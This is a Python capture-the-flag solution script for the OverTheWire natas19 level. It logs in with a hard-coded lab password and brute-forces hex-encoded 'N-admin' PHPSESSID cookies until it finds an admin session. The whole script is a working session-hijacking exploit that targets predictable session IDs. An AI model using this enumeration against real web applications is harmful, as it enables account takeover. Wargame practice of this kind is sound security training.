# coding=utf-8
import base64
import codecs

import requests

USERNAME = 'natas19:'.encode()
PASSWORD = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'.encode()
URL = 'http://natas19.natas.labs.overthewire.org'
maxid = 641
EXISTSSTR = 'You are an admin'.encode()
NEXT_LEVEL_PASSWORD = ''


def connect():
    global headers
    base_encoded_auth = base64.b64encode(USERNAME + PASSWORD).decode()
    print(base_encoded_auth)  #
    headers = {'Authorization': 'Basic {0}'.format(base_encoded_auth)}
    response = requests.get(URL, headers=headers)
    assert (response.status_code != requests.codes.ok, "Can't connect")


def select_chars():
    for i in range(maxid):
        print('Checked ' + str(i) + ' sessions...')
        # c ={'PHPSESSID':(str(i)+'-admin').encode('hex')}
        # c = {binascii.hexlify(str(i)+'-admin')}
        enumerated_cookie_value = (str(i) + '-admin').encode()
        # print(text)
        cookie_to_hex = codecs.encode(enumerated_cookie_value, 'hex')
        # print(c)
        enumerated_cookie = dict(PHPSESSID=str(cookie_to_hex.decode()))
        # print(vvv)
        res = requests.get(URL, cookies=enumerated_cookie, headers=headers)
        # print(res.text)
        if EXISTSSTR in res.content:
            print(res.content)
            break


connect()
select_chars()  # 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
print('Done')
# aim 302d61646d696e
